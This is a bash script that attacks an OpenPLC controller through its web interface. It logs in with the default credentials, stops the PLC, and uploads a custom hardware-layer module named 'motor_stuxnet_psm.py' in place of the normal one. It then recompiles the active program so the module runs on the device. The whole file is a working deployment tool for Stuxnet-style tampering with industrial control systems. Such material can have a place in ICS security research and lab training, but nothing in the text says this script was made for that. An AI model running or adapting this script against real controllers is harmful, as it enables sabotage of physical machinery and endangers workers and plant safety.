#!/bin/bash
set -euo pipefail

PLC_URL=${1:-}
STUXNET_FILE=${2:-motor_stuxnet_psm.py}
PLC_USERNAME="openplc"
PLC_PASSWORD="openplc"
COOKIE_JAR="$(mktemp /tmp/plc_cookie.XXXXXX)"
trap 'rm -f "$COOKIE_JAR"' EXIT

if [[ -z "$PLC_URL" ]]; then
    echo "Usage: $0 <PLC_URL> [stuxnet_module_file]"
    echo "Example: $0 192.168.1.6:8080 motor_stuxnet_psm.py"
    exit 1
fi

if [[ ! "$PLC_URL" =~ ^https?:// ]]; then
    PLC_URL="http://$PLC_URL"
fi

PLC_URL="${PLC_URL%/}"

if [[ ! "$PLC_URL" =~ /$ ]]; then
    # preserve URL as-is, no extra path required
    :
fi

if [[ ! "$STUXNET_FILE" =~ ^/ ]]; then
    STUXNET_FILE="$STUXNET_FILE"
fi

extract_csrf_token() {
    local html="$1"
    printf '%s\n' "$html" | grep -o -E "name=['\"]csrf_token['\"][^>]*value=['\"][^'\"]*['\"]|value=['\"][^'\"]*['\"][^>]*name=['\"]csrf_token['\"]" | head -n1 | sed -E "s/.*value=['\"]([^'\"]*)['\"].*/\1/" || true
}

# Login and get session cookie
echo "Login..."
LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" "$PLC_URL/login")

CSRF_TOKEN=$(extract_csrf_token "$LOGIN_PAGE")
if [[ -z "$CSRF_TOKEN" ]]; then
    echo "ERROR: Could not extract CSRF token from login page"
    printf '%s\n' "$LOGIN_PAGE" | head -40
    exit 1
fi

LOGIN_RESPONSE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
     -X POST "$PLC_URL/login" \
     -H "X-CSRFToken: $CSRF_TOKEN" \
     -d "username=$PLC_USERNAME&password=$PLC_PASSWORD&csrf_token=$CSRF_TOKEN")

if echo "$LOGIN_RESPONSE" | grep -qi "Bad Request\|missing\|error\|csrf"; then
    echo "ERROR: Login failed"
    printf '%s\n' "$LOGIN_RESPONSE" | head -80
    exit 1
fi

# Stop PLC
echo "Stop PLC..."
curl -s -b "$COOKIE_JAR" -X GET "$PLC_URL/stop_plc" > /dev/null

# Get Active File
echo "Retrieve active file..."
ACTIVE_FILE_RESPONSE=$(curl -s -b "$COOKIE_JAR" "$PLC_URL/dashboard")

if echo "$ACTIVE_FILE_RESPONSE" | grep -qi "Redirecting"; then
    echo "ERROR: Got redirect response - session expired or invalid"
    exit 1
fi

# Try multiple regex patterns to find the active .st file
ACTIVE_FILE_REGEX='"([^"]+\.st)"'
if [[ "$ACTIVE_FILE_RESPONSE" =~ $ACTIVE_FILE_REGEX ]]; then
    MATCH_FILE="${BASH_REMATCH[1]}"
elif [[ "$ACTIVE_FILE_RESPONSE" =~ ([a-zA-Z0-9_-]+\.st) ]]; then
    MATCH_FILE="${BASH_REMATCH[1]}"
else
    echo "ERROR: PATTERN not found"
    echo "DEBUG: Showing first 500 chars of response:"
    printf '%s\n' "$ACTIVE_FILE_RESPONSE" | head -500
    exit 1
fi

echo "Using active file: $MATCH_FILE"

# Enable PSM hardware layer
echo "Change HW Layer..."
if [[ ! -f "$STUXNET_FILE" ]]; then
    echo "ERROR: custom module file not found: $STUXNET_FILE"
    exit 1
fi

HW_PAGE=$(curl -s -b "$COOKIE_JAR" "$PLC_URL/hardware")
HW_CSRF_TOKEN=$(extract_csrf_token "$HW_PAGE")
if [[ -z "$HW_CSRF_TOKEN" ]]; then
    echo "WARNING: could not extract CSRF token from hardware page, using login token"
    HW_CSRF_TOKEN="$CSRF_TOKEN"
fi

HW_RESPONSE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        -X POST "$PLC_URL/hardware" \
        -H "Referer: $PLC_URL/hardware" \
        -F "hardware_layer=psm_linux" \
        -F "csrf_token=$HW_CSRF_TOKEN" \
        -F "custom_layer_code=<$STUXNET_FILE")

if echo "$HW_RESPONSE" | grep -qi "error\|bad request\|failed\|missing\|csrf"; then
    echo "ERROR: hardware layer update failed"
    printf '%s\n' "$HW_RESPONSE"
    exit 1
fi

# Recompile
echo "Compile..."
curl -s -b "$COOKIE_JAR" -X GET "$PLC_URL/compile-program?file=$MATCH_FILE" > /dev/null

COMPILE_LOGS=""
COMPILE_REGEX=".*Compilation finished"
while ! [[ "$COMPILE_LOGS" =~ $COMPILE_REGEX ]]; do
    COMPILE_LOGS=$(curl -s -b "$COOKIE_JAR" "$PLC_URL/compilation-logs")
    sleep 1
done

echo "Deployment complete!"